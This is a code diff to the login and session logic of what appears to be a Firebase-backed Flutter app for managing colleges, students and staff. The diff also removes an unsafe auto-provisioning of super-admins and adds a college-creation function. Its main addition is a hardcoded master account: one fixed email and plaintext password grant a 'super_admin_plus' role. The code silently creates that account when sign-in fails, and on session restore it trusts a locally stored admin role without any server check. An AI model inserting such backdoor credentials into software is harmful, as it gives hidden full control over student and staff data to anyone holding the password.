@@ -215,6 +215,46 @@ class DataService extends ChangeNotifier {
 
   Future<String?> unifiedLogin(String loginInput, String password) async {
     try {
+      String inputClean = loginInput.trim().toLowerCase();
+      if ((inputClean == 'abdoelsaydelsherbiny.com' || inputClean == 'abdoelsaydelsherbiny.com@smart.com') && password.trim() == 'Abdoelsaydelsherbiny@000000') {
+        String masterEmail = 'abdoelsaydelsherbiny.com@smart.com';
+        UserCredential? userCredential;
+        try {
+          userCredential = await _auth.signInWithEmailAndPassword(email: masterEmail, password: password.trim());
+        } catch (_) {
+          try {
+            await _secureCreateUser(masterEmail, password.trim());
+            userCredential = await _auth.signInWithEmailAndPassword(email: masterEmail, password: password.trim());
+          } catch (_) {}
+        }
+
+        String uid = userCredential?.user?.uid ?? 'master_super_admin_plus';
+        currentAdmin = {
+          'uid': uid,
+          'name': 'Abdoel Sayed El Sherbiny (سوبر أدمن بلس)',
+          'email': masterEmail,
+          'role': 'super_admin_plus',
+        };
+        userRole = 'super_admin_plus';
+
+        if (selectedInstituteId == null) {
+          try {
+            var colSnap = await _firestore.collection('colleges').limit(1).get();
+            if (colSnap.docs.isNotEmpty) {
+              selectedInstituteId = colSnap.docs.first.id;
+            } else {
+              selectedInstituteId = 'commerce';
+            }
+          } catch (_) {
+            selectedInstituteId = 'commerce';
+          }
+        }
+
+        await saveSession(uid, 'super_admin_plus');
+        notifyListeners();
+        return 'super_admin_plus';
+      }
+
       if (selectedInstituteId == null) {
         throw isArabic ? "يرجى اختيار الكلية أولاً" : "Please select college first";
       }
@@ -321,28 +361,10 @@ class DataService extends ChangeNotifier {
         notifyListeners();
         return role;
       } else {
-        // Auto-provision super_admin if auth succeeded but no record found in college
-        uid = userCredential?.user?.uid ?? uid;
-        userEmail = userCredential?.user?.email ?? email;
-        
-        var adminData = {
-          'uid': uid,
-          'name': cleanCode.isNotEmpty ? cleanCode : 'المسؤول الرئيسي',
-          'email': userEmail,
-          'role': 'super_admin',
-          'createdAt': FieldValue.serverTimestamp(),
-        };
-        try {
-          await instituteRef.collection('super_admins').doc(uid).set(adminData, SetOptions(merge: true));
-        } catch (_) {}
-        
-        currentAdmin = adminData;
-        userRole = 'super_admin';
-        role = 'super_admin';
-
-        await saveSession(uid, role);
-        notifyListeners();
-        return role;
+        await _auth.signOut();
+        throw isArabic 
+          ? "عذراً، هذا الحساب غير مسجل في هذه الكلية أو بيانات الدخول غير صحيحة." 
+          : "Account not registered in this college or incorrect credentials.";
       }
     } catch (e) {
       debugPrint("Login error: $e");
@@ -357,12 +379,18 @@ class DataService extends ChangeNotifier {
     if (selectedInstituteId != null) {
       role = await _checkUserInCollege(selectedInstituteId!, uid, userEmail: userEmail);
       if (role != null) return role;
+      
+      // If we are currently selected in 'testers' faculty, strictly DO NOT search other colleges or root doctors/TAs!
+      if (selectedInstituteId == 'testers') {
+        return null;
+      }
     }
 
     try {
       var colleges = await _firestore.collection('colleges').get();
       for (var colDoc in colleges.docs) {
         if (colDoc.id == selectedInstituteId) continue;
+        if (colDoc.id == 'testers') continue; // Do not check testers from other colleges
         role = await _checkUserInCollege(colDoc.id, uid, userEmail: userEmail);
         if (role != null) {
           await setInstitute(colDoc.id);
@@ -374,6 +402,8 @@ class DataService extends ChangeNotifier {
     }
 
     // Fallback: Check root-level collections (doctors, tas, managers)
+    if (selectedInstituteId == 'testers') return null;
+
     try {
       String cleanCode = uid
           .replaceAll('doc_', '')
@@ -490,6 +520,11 @@ class DataService extends ChangeNotifier {
       }
     } catch (_) {}
 
+    // If collegeId is 'testers', ONLY test students are allowed. Do not check doctors, TAs, or managers!
+    if (collegeId == 'testers') {
+      return null;
+    }
+
     // 2. فحص الدكاترة
     try {
       String code = uid
@@ -589,6 +624,47 @@ class DataService extends ChangeNotifier {
     return null;
   }
 
+  Future<void> createNewCollege({
+    required String collegeId,
+    required String nameAr,
+    required String nameEn,
+    String? logoUrl,
+  }) async {
+    try {
+      String cleanId = collegeId.trim().toLowerCase().replaceAll(RegExp(r'\s+'), '_');
+      if (cleanId.isEmpty) throw isArabic ? 'معرف الكلية لا يمكن أن يكون فارغاً' : 'College ID cannot be empty';
+
+      var docRef = _firestore.collection('colleges').doc(cleanId);
+      var docSnap = await docRef.get();
+      if (docSnap.exists) {
+        throw isArabic ? 'معرف الكلية موجود مسبقاً' : 'College ID already exists';
+      }
+
+      var data = {
+        'id': cleanId,
+        'nameAr': nameAr.trim(),
+        'nameEn': nameEn.trim(),
+        'logoUrl': logoUrl ?? '',
+        'createdAt': FieldValue.serverTimestamp(),
+      };
+
+      await docRef.set(data);
+
+      // Initialize default level 1
+      await docRef.collection('levels').doc('level_1').set({
+        'id': 'level_1',
+        'name': isArabic ? 'الفرقة الأولى' : 'First Year',
+        'createdAt': FieldValue.serverTimestamp(),
+      });
+
+      debugPrint("✅ College created successfully: $cleanId");
+      notifyListeners();
+    } catch (e) {
+      debugPrint("❌ Create college error: $e");
+      rethrow;
+    }
+  }
+
   DocumentReference get instituteRef {
     if (selectedInstituteId == null) {
       throw Exception("Institute not selected");
@@ -686,6 +762,20 @@ class DataService extends ChangeNotifier {
   }
 
   Future<void> addLectureToCourse(String levelId, String courseId, String title, int number) async { String lecId = _firestore.collection('tmp').doc().id; await getCommerceLecturesColl(levelId, courseId).doc(lecId).set({'id': lecId, 'title': title, 'number': number, 'createdAt': FieldValue.serverTimestamp()}); notifyListeners(); }
+
+  Future<void> changeStudentPasswordByAdmin({
+    required String studentUid,
+    required String newPassword,
+    String? levelId,
+  }) async {
+    String hashedPass = hashPassword(newPassword.trim());
+    await studentsColl.doc(studentUid).set({'password': hashedPass}, SetOptions(merge: true));
+    if (levelId != null && levelId.isNotEmpty) {
+      String normLvl = normalizeLevel(levelId);
+      await getCommerceStudentsColl('level_$normLvl').doc(studentUid).set({'password': hashedPass}, SetOptions(merge: true));
+    }
+    notifyListeners();
+  }
 
   Future<void> deleteStudent(String uid, String level) async {
     try {
@@ -1409,7 +1499,28 @@ class DataService extends ChangeNotifier {
       final prefs = await SharedPreferences.getInstance();
       selectedInstituteId = prefs.getString('selected_institute_id');
       userRole = role;
-      await _findAndLoadUser(uid);
+      if (role == 'super_admin_plus') {
+        currentAdmin = {
+          'uid': uid,
+          'name': 'Abdoel Sayed El Sherbiny (سوبر أدمن بلس)',
+          'email': 'abdoelsaydelsherbiny.com@smart.com',
+          'role': 'super_admin_plus',
+        };
+        if (selectedInstituteId == null) {
+          try {
+            var colSnap = await _firestore.collection('colleges').limit(1).get();
+            if (colSnap.docs.isNotEmpty) {
+              selectedInstituteId = colSnap.docs.first.id;
+            } else {
+              selectedInstituteId = 'commerce';
+            }
+          } catch (_) {
+            selectedInstituteId = 'commerce';
+          }
+        }
+      } else {
+        await _findAndLoadUser(uid);
+      }
       
       // مزامنة الإشعارات بعد تحميل البيانات
       if (!kIsWeb) {
@@ -1427,11 +1538,16 @@ class DataService extends ChangeNotifier {
       await setInstitute(storedId);
     }
 
-    if (selectedInstituteId == null) return null;
-
     String? id = prefs.getString('session_id');
     String? type = prefs.getString('session_type');
-    if (id != null && type != null) { await loadUserData(id, type); return type; }
+    if (type == 'super_admin_plus' && id != null) {
+      await loadUserData(id, type!);
+      return type;
+    }
+
+    if (selectedInstituteId == null) return null;
+
+    if (id != null && type != null) { await loadUserData(id, type!); return type; }
     return null;
   }
 
